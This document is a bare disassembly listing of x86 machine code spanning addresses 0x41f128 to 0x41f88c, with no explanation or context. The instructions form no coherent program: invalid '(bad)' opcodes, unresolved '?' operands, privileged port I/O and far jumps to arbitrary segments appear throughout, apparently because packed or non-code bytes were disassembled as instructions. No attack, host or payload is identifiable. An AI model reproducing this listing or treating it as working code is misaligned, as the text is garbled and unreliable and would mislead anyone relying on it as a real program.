  41f128:	and    esp,DWORD PTR [edi]
  41f12a:	fcmove st,st(3)
  41f12c:	aaa    
  41f12d:	fwait
  41f12e:	pop    esp
  41f12f:	sar    esi,1
  41f131:	push   cs
  41f132:	aam    0xa8
  41f134:	je     0x41f196
  41f136:	sub    al,0x16
  41f138:	or     eax,0x8ec3ca42
  41f13d:	mov    ss:0x40a55f08,al
  41f143:	iret   
  41f144:	stos   DWORD PTR es:[edi],eax
  41f145:	push   esp
  41f146:	sti    
  41f147:	js     0x41f190
  41f149:	loop   0x41f0e7
  41f14b:	sahf   
  41f14c:	jae    0x41f130
  41f14e:	mov    dl,0xe6
  41f150:	into   
  41f151:	jl     0x41f0da
  41f153:	dec    ebp
  41f154:	mov    ?,esp
  41f156:	xchg   ebp,eax
  41f157:	stos   DWORD PTR es:[edi],eax
  41f158:	loop   0x41f0fb
  41f15a:	ret    0x6f2e
  41f15d:	mov    al,ds:0xde007b08
  41f162:	fisubr WORD PTR [esi+0x34dd2664]
  41f168:	cmp    al,0xb4
  41f16b:	push   es
  41f16c:	mov    ds:0xaa50fcef,al
  41f171:	iret   
  41f172:	outs   dx,DWORD PTR ds:[esi]
  41f173:	mov    cl,0xbd
  41f175:	cmp    ebp,ebx
  41f177:	in     al,0x58
  41f179:	cmc    
  41f17a:	mov    ch,0xe5
  41f17c:	jmp    0xcb16:0x4366fac0
  41f183:	jmp    0x145f951a
  41f188:	fwait
  41f189:	sbb    al,0xa4
  41f18b:	sbb    DWORD PTR [eax-0x15d74f5],ebp
  41f191:	push   edi
  41f192:	mov    dh,0x2f
  41f194:	nop
  41f195:	dec    esi
  41f196:	mov    ebp,0x64719760
  41f19b:	loope  0x41f132
  41f19d:	push   esi
  41f19e:	or     eax,0xa8008a30
  41f1a3:	inc    edi
  41f1a4:	cmp    al,0x55
  41f1a6:	or     ch,dh
  41f1a8:	push   cs
  41f1a9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f1aa:	repz sub ecx,ebx
  41f1ad:	rcl    ah,0xf3
  41f1b0:	sbb    DWORD PTR [edi],0x63eba56d
  41f1b6:	outs   dx,DWORD PTR ds:[esi]
  41f1b7:	adc    al,0xc2
  41f1b9:	cmc    
  41f1ba:	xchg   ebp,eax
  41f1bb:	gs dec ebx
  41f1bd:	cmp    ch,BYTE PTR [edi]
  41f1bf:	or     BYTE PTR [edx-0x26ac6160],bh
  41f1c5:	cmc    
  41f1c6:	push   cs
  41f1c7:	leave  
  41f1c8:	or     DWORD PTR [ecx+eiz*1],eax
  41f1cb:	cmp    DWORD PTR [edi-0x5cf01a0e],esp
  41f1d1:	cdq    
  41f1d2:	pop    esi
  41f1d3:	leave  
  41f1d4:	stc    
  41f1d5:	dec    ebp
  41f1d6:	out    0x56,eax
  41f1d8:	dec    esp
  41f1d9:	scas   eax,DWORD PTR es:[edi]
  41f1da:	dec    esi
  41f1db:	in     al,0x8a
  41f1dd:	add    DWORD PTR ss:[eax-0x4c],esp
  41f1e1:	jnp    0x41f1bf
  41f1e3:	inc    ebp
  41f1e4:	cmp    DWORD PTR [eax-0x49],ebp
  41f1e7:	lock (bad) 
  41f1ea:	sbb    DWORD PTR [ebp-0x5e],esp
  41f1ed:	in     eax,dx
  41f1ee:	iret   
  41f1ef:	hlt    
  41f1f0:	(bad)  
  41f1f1:	fiadd  WORD PTR [ecx+edx*4-0x2d]
  41f1f5:	mov    esp,edi
  41f1f7:	ins    DWORD PTR es:[edi],dx
  41f1f8:	adc    DWORD PTR [edx],ebp
  41f1fa:	repnz sub DWORD PTR [ebx+eax*4],0xffffffac
  41f1ff:	(bad)  
  41f200:	shl    DWORD PTR [ebx-0x4bda9393],cl
  41f206:	jle    0x41f1f1
  41f208:	pop    ebp
  41f209:	ror    DWORD PTR [eax+0x483f21cd],cl
  41f20f:	icebp  
  41f210:	push   0x19
  41f212:	and    eax,0x74cb8c90
  41f217:	push   ds
  41f218:	mov    esi,0xc6d37ef7
  41f21d:	(bad)  
  41f21e:	inc    edi
  41f21f:	bound  ecx,QWORD PTR [ebx+eax*1+0x7b73c216]
  41f226:	xchg   ebp,eax
  41f227:	add    BYTE PTR [esi],bl
  41f229:	jg     0x41f1fe
  41f22b:	sti    
  41f22c:	jmp    0xccb5:0x2dc0c82d
  41f233:	sahf   
  41f234:	cmp    eax,0x73ae289d
  41f239:	cli    
  41f23a:	ins    BYTE PTR es:[edi],dx
  41f23b:	das    
  41f23c:	cmp    edx,DWORD PTR [ebp+0x73e04898]
  41f242:	fist   DWORD PTR [edx]
  41f244:	dec    edx
  41f245:	mov    ds:0xec181348,al
  41f24a:	stc    
  41f24b:	aas    
  41f24c:	sbb    al,0x24
  41f24e:	dec    ebx
  41f24f:	cmp    BYTE PTR [edi],ah
  41f251:	mov    bh,0x6d
  41f253:	cmp    BYTE PTR [eax+edx*2+0x68],dh
  41f257:	shl    DWORD PTR [eax+0x2d],cl
  41f25a:	mov    ds:0xf6397b7d,eax
  41f25f:	mov    ebp,0x4093ae50
  41f264:	outs   dx,DWORD PTR ds:[esi]
  41f265:	push   cs
  41f266:	daa    
  41f267:	add    BYTE PTR [eax+0xd],ah
  41f26a:	rcl    DWORD PTR [esi],cl
  41f26c:	mov    bh,0x82
  41f26e:	data16 lahf 
  41f270:	in     eax,dx
  41f271:	push   edx
  41f272:	(bad)  
  41f273:	int    0x5b
  41f275:	add    cl,BYTE PTR [edi+0x4b]
  41f278:	sub    DWORD PTR [ecx+ebx*8+0x53],ebx
  41f27c:	xchg   ebp,eax
  41f27d:	mov    ebx,0xd60506f9
  41f282:	lods   al,BYTE PTR ds:[esi]
  41f283:	je     0x41f2af
  41f285:	mov    bl,0xb5
  41f287:	inc    edi
  41f288:	les    ebp,FWORD PTR [ecx+0x544114cf]
  41f28e:	jmp    0x4b82:0x5eaae590
  41f295:	aam    0xe3
  41f297:	xchg   esp,eax
  41f298:	pop    ss
  41f299:	ret    0x113
  41f29c:	xor    eax,0x326ffbcc
  41f2a1:	mov    esp,0xc5e0ffa8
  41f2a6:	dec    ecx
  41f2a7:	dec    BYTE PTR [esp+ebp*2-0x5a5ff109]
  41f2ae:	sub    ecx,ebx
  41f2b0:	sbb    ch,bh
  41f2b2:	ja     0x41f263
  41f2b4:	cld    
  41f2b5:	dec    esi
  41f2b6:	push   cs
  41f2b7:	popf   
  41f2b8:	mov    esp,0x1c5250f7
  41f2bd:	mov    edi,0x1247b204
  41f2c2:	sbb    dl,cl
  41f2c4:	pop    esi
  41f2c5:	adc    dh,ah
  41f2c7:	inc    esi
  41f2c8:	retf   0xb596
  41f2cb:	ja     0x41f279
  41f2cd:	adc    BYTE PTR [eax],0x9e
  41f2d0:	cmp    ebx,esi
  41f2d2:	cli    
  41f2d3:	cmp    eax,0xacd74aae
  41f2d8:	shr    DWORD PTR [esi+0x581d5580],1
  41f2de:	sub    bh,BYTE PTR [edx+0x4d]
  41f2e1:	mov    DWORD PTR [ebx],edi
  41f2e3:	jo     0x41f357
  41f2e5:	push   edi
  41f2e6:	mov    ds:0x8743acd2,ax
  41f2ec:	add    al,0x71
  41f2ee:	push   cs
  41f2ef:	push   ss
  41f2f0:	iret   
  41f2f1:	aaa    
  41f2f2:	popa   
  41f2f3:	dec    ebp
  41f2f4:	cli    
  41f2f5:	dec    eax
  41f2f6:	mov    ch,0x1
  41f2f8:	js     0x41f2cb
  41f2fa:	push   ebp
  41f2fb:	dec    ebx
  41f2fc:	cmp    BYTE PTR [eax-0x5c],ah
  41f2ff:	ror    DWORD PTR [edx+0x1a],cl
  41f302:	jae    0x41f341
  41f304:	aaa    
  41f305:	add    BYTE PTR [esp+ebp*4+0x65],0xca
  41f30a:	lock sbb dh,bh
  41f30d:	mov    edx,0xc2516080
  41f312:	jnp    0x41f2a2
  41f314:	mov    edx,DWORD PTR [ecx]
  41f316:	enter  0x40a5,0x1a
  41f31a:	bound  esi,QWORD PTR [ecx+esi*2]
  41f31d:	add    BYTE PTR [eax],al
  41f31f:	add    BYTE PTR [eax],al
  41f321:	add    BYTE PTR [ebx],ch
  41f323:	mov    eax,ds:0xf6cb1443
  41f328:	jg     0x41f2e9
  41f32a:	test   ch,ch
  41f32c:	out    dx,al
  41f32d:	cmp    dl,0xa0
  41f330:	les    edx,FWORD PTR [ebx]
  41f332:	out    0x6d,al
  41f334:	add    DWORD PTR [eax],eax
  41f336:	repz add al,0x0
  41f339:	add    BYTE PTR [ebp+0x156e51b0],ah
  41f33f:	jge    0x41f363
  41f341:	scas   al,BYTE PTR es:[edi]
  41f342:	mov    esi,0xf8c8df77
  41f347:	btc    DWORD PTR [ecx+ecx*1+0xccf7003],edx
  41f34f:	dec    edx
  41f350:	jge    0x41f34d
  41f352:	hlt    
  41f353:	push   edx
  41f354:	mov    al,0xe8
  41f356:	pop    ds
  41f357:	loopne 0x41f315
  41f359:	xchg   edi,eax
  41f35a:	cwde   
  41f35b:	sbb    bh,0xc6
  41f35e:	sub    edx,esp
  41f360:	outs   dx,DWORD PTR ds:[esi]
  41f361:	or     esp,DWORD PTR [eax]
  41f363:	js     0x41f32e
  41f365:	or     BYTE PTR [ebx+0x1789947e],al
  41f36b:	mov    eax,DWORD PTR [eax+0x7ea782fb]
  41f371:	or     BYTE PTR [esi],al
  41f373:	cmp    BYTE PTR [eax-0xd116554],al
  41f379:	ja     0x41f367
  41f37b:	pop    edi
  41f37c:	push   edx
  41f37d:	jle    0x41f3b1
  41f37f:	adc    bl,dl
  41f381:	inc    ebp
  41f382:	test   BYTE PTR [edi],al
  41f384:	mov    esp,0xf44a88e1
  41f389:	jb     0x41f3df
  41f38b:	and    al,dl
  41f38d:	xchg   ecx,eax
  41f38e:	sar    BYTE PTR ds:0xdb944b5,1
  41f394:	push   ds
  41f395:	sbb    eax,0x24452c7a
  41f39a:	pop    ss
  41f39b:	push   ecx
  41f39c:	mov    ds:0xcec211fe,al
  41f3a1:	std    
  41f3a2:	cmp    BYTE PTR ds:0x66445308,dh
  41f3a8:	jecxz  0x41f411
  41f3aa:	or     al,0x35
  41f3ac:	mov    dh,dh
  41f3ae:	dec    ebx
  41f3af:	daa    
  41f3b0:	fdivr  DWORD PTR [edx]
  41f3b2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f3b3:	cmp    cl,al
  41f3b5:	push   ebx
  41f3b6:	lods   al,BYTE PTR ds:[esi]
  41f3b7:	pop    ss
  41f3b8:	or     DWORD PTR ds:0xc200c932,esi
  41f3be:	push   ebp
  41f3bf:	push   0xffffffcc
  41f3c1:	mov    bl,BYTE PTR [eax]
  41f3c3:	(bad)  
  41f3c4:	sub    DWORD PTR [ebx-0x18245f97],edx
  41f3ca:	mov    ecx,ss
  41f3cc:	jge    0x41f402
  41f3ce:	je     0x41f436
  41f3d0:	loop   0x41f3dd
  41f3d2:	(bad)  
  41f3d3:	cmp    al,0x73
  41f3d5:	push   edx
  41f3d6:	iret   
  41f3d7:	js     0x41f366
  41f3d9:	push   ss
  41f3da:	or     edi,DWORD PTR [eax+ebx*2+0x42]
  41f3de:	push   esi
  41f3df:	inc    ebx
  41f3e0:	mov    cl,0xe9
  41f3e2:	pop    ds
  41f3e3:	test   BYTE PTR [edi+0x6a],bh
  41f3e6:	jg     0x41f3ca
  41f3e8:	sbb    esi,DWORD PTR [ebp+0x4efe8a5a]
  41f3ee:	loop   0x41f41e
  41f3f0:	loop   0x41f407
  41f3f2:	je     0x41f3a4
  41f3f4:	out    0xdc,eax
  41f3f6:	shr    BYTE PTR [edi+eax*1],1
  41f3f9:	mov    esp,esi
  41f3fb:	std    
  41f3fc:	push   ecx
  41f3fd:	arpl   WORD PTR [ebp-0x7f],dx
  41f400:	aam    0xf3
  41f402:	push   ebp
  41f403:	sub    ebp,DWORD PTR cs:[eax-0x73]
  41f407:	and    al,0x6e
  41f409:	fs sub eax,0xecd359
  41f40f:	pop    ebp
  41f410:	(bad)
  41f413:	xor    al,0x2f
  41f415:	(bad)  
  41f416:	jp     0x41f442
  41f418:	retf   
  41f419:	xor    edi,eax
  41f41b:	dec    ebx
  41f41c:	mov    ?,esi
  41f41e:	(bad)  
  41f420:	xchg   edi,eax
  41f421:	or     eax,0x2d3b9fb
  41f426:	pop    esi
  41f427:	and    esp,DWORD PTR [eax+0x2f8fc9bd]
  41f42d:	test   DWORD PTR [eax+0x2f53d599],eax
  41f433:	cli    
  41f434:	mov    dl,0xc0
  41f436:	in     al,0x2d
  41f438:	jb     0x41f3eb
  41f43a:	mov    edi,0x7b5c1be7
  41f43f:	and    eax,eax
  41f441:	sub    DWORD PTR [ebx],edi
  41f443:	mov    eax,ds:0xc2e6378a
  41f448:	xor    DWORD PTR [eax],esp
  41f44a:	and    eax,0x3134a5fa
  41f44f:	jmp    0x41f4c9
  41f451:	sbb    dh,dl
  41f453:	in     eax,0x6d
  41f455:	out    0x39,eax
  41f457:	and    eax,0xdd14a6a7
  41f45c:	dec    ecx
  41f45d:	retf   0x63a2
  41f460:	scas   eax,DWORD PTR es:[edi]
  41f461:	jae    0x41f475
  41f463:	mov    edi,DWORD PTR [esi]
  41f465:	adc    DWORD PTR [eax-0x7c8ab046],edi
  41f46b:	loop   0x41f45e
  41f46d:	and    ebp,DWORD PTR ds:0x761b097e
  41f473:	cdq    
  41f474:	or     esp,edi
  41f476:	pop    edx
  41f477:	xchg   ebx,eax
  41f478:	aad    0x1d
  41f47a:	sub    eax,0x4009317d
  41f47f:	dec    edi
  41f480:	sub    eax,0x6546392
  41f485:	adc    al,0x53
  41f487:	call   0x70d4a287
  41f48c:	add    BYTE PTR [edx+0x5fc4789c],ch
  41f492:	push   ecx
  41f493:	shl    DWORD PTR [esi-0x1cc536ea],0xb0
  41f49a:	inc    ecx
  41f49b:	and    al,BYTE PTR [ebx-0x59492aa8]
  41f4a1:	cmp    edx,DWORD PTR [edx]
  41f4a3:	mov    eax,0xf6783ac1
  41f4a8:	inc    ebx
  41f4a9:	inc    ecx
  41f4aa:	jmp    0x46d1:0x28128b99
  41f4b1:	imul   ebp,DWORD PTR [edi-0x507a283],0x3d
  41f4b8:	and    eax,0x38e4233b
  41f4bd:	pop    eax
  41f4be:	adc    al,0xb5
  41f4c0:	sub    BYTE PTR [esi+0x44],0x16
  41f4c4:	and    esp,esi
  41f4c6:	jmp    0x41f502
  41f4c8:	sub    BYTE PTR [edi],ch
  41f4ca:	adc    BYTE PTR [esi-0x53],cl
  41f4cd:	sub    eax,0xefb62984
  41f4d2:	inc    esp
  41f4d3:	xchg   ebp,eax
  41f4d4:	jne    0x41f4f9
  41f4d6:	sbb    al,0xc0
  41f4d8:	ja     0x41f540
  41f4da:	out    dx,eax
  41f4db:	aaa    
  41f4dc:	fist   DWORD PTR [ebx]
  41f4de:	push   esi
  41f4df:	mov    esi,0x60cb6ce5
  41f4e4:	dec    esp
  41f4e5:	movzx  ebp,dh
  41f4e8:	icebp  
  41f4e9:	test   ebp,0x66c4ee51
  41f4ef:	int    0x44
  41f4f1:	les    edx,FWORD PTR [edx+0x3e]
  41f4f4:	dec    eax
  41f4f5:	pop    es
  41f4f6:	jmp    0xfa9c:0x3f5aa5be
  41f4fd:	in     al,0xbb
  41f4ff:	test   DWORD PTR [eax],ecx
  41f501:	mov    dl,dl
  41f503:	dec    ecx
  41f504:	xor    bl,BYTE PTR [ebx]
  41f506:	call   0xb8a4:0x73f4b205
  41f50d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f50e:	xlat   BYTE PTR ds:[ebx]
  41f50f:	xor    DWORD PTR [eax],esp
  41f511:	xchg   edx,eax
  41f512:	scas   eax,DWORD PTR es:[edi]
  41f513:	sbb    ch,bh
  41f515:	mov    DWORD PTR [edx-0x65a91751],edi
  41f51b:	jg     0x41f4a3
  41f51d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f51e:	test   eax,0x89acb4b3
  41f523:	adc    bh,ch
  41f525:	xchg   edi,eax
  41f526:	sti    
  41f527:	ss scas al,BYTE PTR es:[edi]
  41f529:	shr    BYTE PTR [edi+edx*4+0x51],1
  41f52d:	adc    al,0x56
  41f52f:	and    DWORD PTR [ebx-0x143a8da4],ecx
  41f535:	inc    eax
  41f536:	and    edx,DWORD PTR [edx]
  41f538:	pop    esp
  41f539:	sub    DWORD PTR [ecx-0x35499ddd],ecx
  41f53f:	out    dx,eax
  41f540:	pusha  
  41f541:	stos   DWORD PTR es:[edi],eax
  41f542:	cli    
  41f543:	fwait
  41f544:	pop    edi
  41f545:	push   eax
  41f546:	pop    ss
  41f547:	xlat   BYTE PTR ds:[ebx]
  41f548:	xchg   edi,eax
  41f549:	inc    esi
  41f54a:	(bad)  
  41f54b:	mov    edx,0x8c9780d9
  41f550:	xor    eax,0xf0d23ada
  41f555:	das    
  41f556:	push   esi
  41f557:	leave  
  41f558:	pandn  mm6,QWORD PTR [eax-0x1a]
  41f55c:	lea    ebx,[esp+ebx*1-0x21]
  41f560:	cwde   
  41f561:	ficom  DWORD PTR [esi+0xd548326]
  41f567:	jecxz  0x41f532
  41f569:	ret    0x58b2
  41f56c:	stos   BYTE PTR es:[edi],al
  41f56d:	test   BYTE PTR [ebp-0x3718ea87],cl
  41f573:	mov    WORD PTR [ebp+0x6f1b6aac],es
  41f579:	adc    al,0xd6
  41f57b:	add    cl,BYTE PTR [edi+0x7adb2ed0]
  41f581:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f582:	fcmovb st,st(7)
  41f584:	jae    0x41f521
  41f586:	sahf   
  41f587:	fwait
  41f588:	inc    esp
  41f589:	xor    ch,BYTE PTR [edx+0x6c70cbb4]
  41f58f:	scas   al,BYTE PTR es:[edi]
  41f590:	mov    al,ds:0x48aa1e3f
  41f595:	adc    al,0xaf
  41f597:	cmp    DWORD PTR [eax],0xf0460826
  41f59d:	into   
  41f59e:	xchg   ebx,eax
  41f59f:	xlat   BYTE PTR ds:[ebx]
  41f5a0:	inc    eax
  41f5a1:	pop    ecx
  41f5a2:	mov    ch,BYTE PTR [eax+0x1e]
  41f5a5:	mov    ds:0xe0b7f6dd,eax
  41f5aa:	jne    0x41f5cc
  41f5ac:	fabs   
  41f5ae:	mov    ds:0x877da28,al
  41f5b3:	outs   dx,DWORD PTR ds:[esi]
  41f5b4:	mov    ebx,0x179173ea
  41f5b9:	xor    edi,DWORD PTR [edi]
  41f5bb:	call   0x9fa:0xac7fecd5
  41f5c2:	rcl    BYTE PTR [esi-0x65160955],cl
  41f5c8:	push   edx
  41f5c9:	mov    al,dl
  41f5cb:	inc    ebp
  41f5cc:	mov    bh,0x73
  41f5ce:	xor    al,0x48
  41f5d0:	xchg   ecx,eax
  41f5d1:	enter  0x5cb6,0xd2
  41f5d5:	jle    0x41f59c
  41f5d7:	adc    al,0x73
  41f5d9:	in     al,dx
  41f5da:	shl    BYTE PTR [ebx-0x56710a31],cl
  41f5e0:	or     al,0x63
  41f5e2:	mov    al,ds:0x4455ec55
  41f5e7:	xchg   ebx,eax
  41f5e8:	or     BYTE PTR [esp+edi*8],dh
  41f5eb:	loop   0x41f617
  41f5ed:	dec    esi
  41f5ee:	data16 cmp BYTE PTR [ecx+0x55],dl
  41f5f2:	scas   al,BYTE PTR es:[edi]
  41f5f3:	test   BYTE PTR [ecx+0x76],al
  41f5f6:	xor    al,0x7c
  41f5f8:	pop    ds
  41f5f9:	pop    es
  41f5fa:	mov    ds:0xd83907b3,al
  41f5ff:	mov    al,dl
  41f601:	lods   al,BYTE PTR ds:[esi]
  41f602:	mov    esp,0x2a2d9334
  41f607:	sti    
  41f608:	jmp    0x41f59b
  41f60a:	cli    
  41f60b:	and    al,BYTE PTR [eax+0x12]
  41f60e:	mov    edx,0x115f3b84
  41f613:	adc    BYTE PTR [ebx+ebp*2+0x45],dh
  41f617:	jbe    0x41f686
  41f619:	aad    0xe6
  41f61b:	adc    cl,dl
  41f61d:	xlat   BYTE PTR ds:[ebx]
  41f61e:	fsub   st,st(7)
  41f620:	dec    ecx
  41f621:	push   edi
  41f622:	test   dl,bh
  41f624:	cdq    
  41f625:	js     0x41f612
  41f627:	cs add eax,0xe2ea3dc9
  41f62d:	xchg   al,cl
  41f62f:	imul   edi,ebp,0xffffffc3
  41f632:	(bad)  
  41f634:	iret   
  41f635:	sub    DWORD PTR [ebx-0x2c],0x15
  41f639:	sbb    BYTE PTR [ecx+0x7],0x84
  41f63d:	inc    esp
  41f63e:	(bad)  
  41f63f:	dec    esi
  41f640:	addr16 ss sub edi,ebx
  41f644:	imul   edi
  41f646:	ret    
  41f647:	mov    al,0xc7
  41f649:	(bad)  
  41f64a:	xchg   ebx,eax
  41f64b:	fs loop 0x41f5d2
  41f64e:	or     ch,BYTE PTR ds:0x8d5af151
  41f654:	adc    BYTE PTR [edx+0x25d24b5d],dl
  41f65a:	jae    0x41f643
  41f65c:	and    BYTE PTR [edx-0x60],dh
  41f65f:	(bad)  
  41f661:	lea    eax,ss:[esi-0x7b61e50]
  41f668:	mov    ecx,0x3a925127
  41f66d:	sub    al,BYTE PTR [ebx+0x5a4a4afd]
  41f673:	fisubr DWORD PTR [eax*2-0x21b77f2b]
  41f67a:	aam    0x58
  41f67c:	les    edx,FWORD PTR [edx+ebx*2]
  41f67f:	in     al,0x20
  41f681:	iret   
  41f682:	shl    dl,1
  41f684:	jo     0x41f60c
  41f686:	mov    ebx,0xbe58d954
  41f68b:	mov    dl,0x2f
  41f68d:	inc    DWORD PTR [eax+ecx*8]
  41f690:	and    esp,edx
  41f692:	aad    0xbf
  41f694:	mov    edi,DWORD PTR [eax]
  41f696:	addr16 inc ecx
  41f698:	ss jae 0x41f6cb
  41f69b:	sahf   
  41f69c:	stos   BYTE PTR es:[edi],al
  41f69d:	(bad)  
  41f69f:	repz pop es
  41f6a1:	xlat   BYTE PTR ds:[ebx]
  41f6a2:	mov    dh,0x2f
  41f6a4:	and    DWORD PTR [ebx+0xf],esp
  41f6a7:	fiadd  WORD PTR [eax]
  41f6a9:	ret    0x64ed
  41f6ac:	and    al,0x7b
  41f6ae:	adc    dl,BYTE PTR [ecx-0x24]
  41f6b1:	xor    BYTE PTR [ecx+edi*2+0xb],dh
  41f6b5:	xlat   BYTE PTR ds:[ebx]
  41f6b6:	(bad)  
  41f6b7:	push   0x9487e46a
  41f6bc:	push   edi
  41f6bd:	push   ebp
  41f6be:	xchg   ebx,esi
  41f6c0:	cmc    
  41f6c1:	pop    ss
  41f6c2:	cdq    
  41f6c3:	out    0x75,al
  41f6c5:	shl    BYTE PTR [eax+0x40],1
  41f6c8:	jno    0x41f705
  41f6ca:	repz push 0xffffff89
  41f6cd:	std    
  41f6ce:	shl    BYTE PTR [esi],cl
  41f6d0:	ret    
  41f6d1:	xchg   esi,eax
  41f6d2:	sub    esi,0xd2c2873c
  41f6d8:	fbld   TBYTE PTR [edi-0x22]
  41f6db:	repnz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f6dd:	xchg   edx,eax
  41f6de:	push   0xdb46e383
  41f6e3:	fdiv   QWORD PTR [edx]
  41f6e5:	pop    ss
  41f6e6:	cmp    al,0x18
  41f6e8:	mov    WORD PTR [eax-0x45315b74],ds
  41f6ee:	xor    edi,edx
  41f6f0:	imul   esp,DWORD PTR [ebp+0x3bc43a29],0x46
  41f6f7:	jne    0x41f67f
  41f6f9:	loop   0x41f73e
  41f6fb:	dec    edi
  41f6fc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f6fd:	add    eax,0x328d401b
  41f702:	in     al,0x97
  41f704:	dec    edi
  41f705:	mov    eax,ds:0x45e33e97
  41f70a:	pop    edi
  41f70b:	mov    BYTE PTR [esi+0x3ffc9198],ch
  41f711:	xor    esi,DWORD PTR [eax-0x7e462f9d]
  41f717:	xchg   esp,eax
  41f718:	loop   0x41f77a
  41f71a:	rcl    DWORD PTR [ebp+eiz*4+0x69],cl
  41f71e:	add    esp,DWORD PTR [ebp+0x39acea1e]
  41f724:	stos   DWORD PTR es:[edi],eax
  41f725:	jp     0x41f6ea
  41f727:	mov    ds:0xfe4a2166,eax
  41f72c:	push   ebp
  41f72d:	jmp    0x41f700
  41f72f:	mov    ecx,0x8404177a
  41f734:	inc    ebx
  41f735:	inc    ebx
  41f736:	pop    es
  41f737:	cmp    ebx,edi
  41f739:	and    eax,0x282e2316
  41f73e:	outs   dx,BYTE PTR ds:[esi]
  41f73f:	or     dl,BYTE PTR [ebx]
  41f741:	jns    0x41f6f9
  41f743:	add    al,0x7f
  41f745:	sar    ebp,0xe0
  41f748:	out    dx,eax
  41f749:	pop    ss
  41f74a:	lods   al,BYTE PTR ds:[esi]
  41f74b:	mov    dl,0xf8
  41f74d:	and    ebx,DWORD PTR [eax-0xf4fd558]
  41f753:	mov    WORD PTR [edx+eax*4+0x766fc1],es
  41f75a:	es push ebx
  41f75c:	ror    BYTE PTR [eax-0x3b],1
  41f75f:	sbb    eax,0xe193f9d
  41f764:	push   ds
  41f765:	push   ss
  41f766:	adc    DWORD PTR [esi+0x1347968c],ebx
  41f76c:	lods   eax,DWORD PTR ds:[esi]
  41f76d:	adc    DWORD PTR [edx+eax*8],eax
  41f770:	dec    ecx
  41f771:	pop    ds
  41f772:	data16 int3 
  41f774:	sub    eax,0x407cd1b6
  41f779:	mov    ch,ch
  41f77b:	(bad)  
  41f77c:	dec    esp
  41f77d:	adc    eax,0x3836fe78
  41f782:	push   ds
  41f783:	or     ebx,DWORD PTR [eax-0x6a]
  41f786:	nop
  41f787:	cli    
  41f788:	xor    ecx,edi
  41f78a:	jl     0x41f7f3
  41f78c:	mov    bl,0xde
  41f78e:	pusha  
  41f78f:	daa    
  41f790:	or     BYTE PTR [eax+0x2e3af79],0xf3
  41f797:	stos   DWORD PTR es:[edi],eax
  41f798:	mov    ds:0xb5aee547,al
  41f79d:	out    0x52,eax
  41f79f:	gs out 0x97,eax
  41f7a2:	mov    ss,WORD PTR [ebx+0x7f2659aa]
  41f7a8:	and    edx,DWORD PTR [esi]
  41f7aa:	cmp    esi,DWORD PTR [ecx-0x72]
  41f7ad:	sub    BYTE PTR [ebp-0x354f7b90],cl
  41f7b3:	lods   eax,DWORD PTR ds:[esi]
  41f7b4:	in     eax,0xc
  41f7b6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f7b7:	fdivr  st,st(6)
  41f7b9:	or     DWORD PTR [edi+0x5f],ebx
  41f7bc:	pop    ds
  41f7bd:	call   0x16c08e40
  41f7c2:	or     al,0x17
  41f7c4:	sub    eax,0xd75bde0c
  41f7c9:	push   0xffffffda
  41f7cb:	or     esi,DWORD PTR [ecx-0x67bd24d7]
  41f7d1:	mov    dl,0xf9
  41f7d3:	sar    DWORD PTR [eax],0x2d
  41f7d6:	push   ebx
  41f7d7:	mov    BYTE PTR [ecx-0x7ca8d477],dl
  41f7dd:	adc    al,0x30
  41f7df:	in     al,0x2e
  41f7e1:	jmp    0x25cedde0
  41f7e6:	add    BYTE PTR [ecx],bl
  41f7e8:	stc    
  41f7e9:	or     DWORD PTR [esi],edi
  41f7eb:	fcomp  DWORD PTR [edi+0x54]
  41f7ee:	xchg   ecx,eax
  41f7ef:	cmp    DWORD PTR [ecx],ebx
  41f7f1:	xchg   bh,ah
  41f7f3:	xlat   BYTE PTR ds:[ebx]
  41f7f4:	and    eax,DWORD PTR [ebx+0x28]
  41f7f7:	push   ecx
  41f7f8:	sbb    DWORD PTR [esp+edx*4-0x3e7cbb9a],edi
  41f7ff:	(bad)  
  41f800:	pop    ds
  41f801:	sbb    DWORD PTR [ebp+0x36],ebx
  41f804:	pop    edi
  41f805:	or     ch,BYTE PTR [edx+esi*1]
  41f808:	and    ebx,DWORD PTR [edx]
  41f80a:	ins    DWORD PTR es:[edi],dx
  41f80b:	not    BYTE PTR [ecx+0x73]
  41f80e:	sub    DWORD PTR [ebx-0x4a],ecx
  41f811:	jge    0x41f82b
  41f813:	(bad)  
  41f814:	leave  
  41f815:	mov    al,ds:0xa7acc66b
  41f81a:	les    esp,FWORD PTR [ebp-0x55ef7a9e]
  41f820:	lds    edi,FWORD PTR [edi]
  41f822:	dec    esp
  41f823:	cmps   DWORD PTR ds:[si],DWORD PTR es:[di]
  41f825:	sar    dh,1
  41f827:	sbb    al,0x6c
  41f829:	and    bh,bl
  41f82b:	xchg   edx,eax
  41f82c:	or     al,BYTE PTR [eax]
  41f82e:	add    BYTE PTR [eax],al
  41f830:	add    BYTE PTR [eax],al
  41f832:	dec    eax
  41f833:	mul    BYTE PTR fs:[eax-0x2]
  41f837:	repnz fisubr WORD PTR [ecx+eiz*8-0x64]
  41f83c:	out    0x52,eax
  41f83e:	jmp    0xda3d4ece
  41f843:	jb     0x41f846
  41f845:	add    bl,dh
  41f847:	add    al,0x0
  41f849:	add    BYTE PTR [esi+0x3c28c1e3],dh
  41f84f:	ss mov ss:0xdec45789,al
  41f856:	xlat   BYTE PTR ds:[ebx]
  41f857:	add    bl,BYTE PTR [ebx+0x2f]
  41f85a:	or     bh,BYTE PTR [ebx]
  41f85c:	or     BYTE PTR [ecx+0x6f5756bb],bl
  41f862:	cdq    
  41f863:	fisttp WORD PTR [ebp+0x77fd5183]
  41f869:	icebp  
  41f86a:	adc    DWORD PTR ss:[ecx-0x6d5d1dc1],eax
  41f871:	loop   0x41f7f4
  41f873:	stc    
  41f874:	and    edx,edx
  41f876:	je     0x41f86e
  41f878:	sub    dl,BYTE PTR [esi-0x337fcaa2]
  41f87e:	pop    edi
  41f87f:	stos   DWORD PTR es:[edi],eax
  41f880:	into   
  41f881:	and    DWORD PTR [esi+eiz*2],ebp
  41f884:	repnz int 0x8
  41f887:	mov    eax,0x90356680
  41f88c:	xlat   BYTE PTR ds:[ebx]
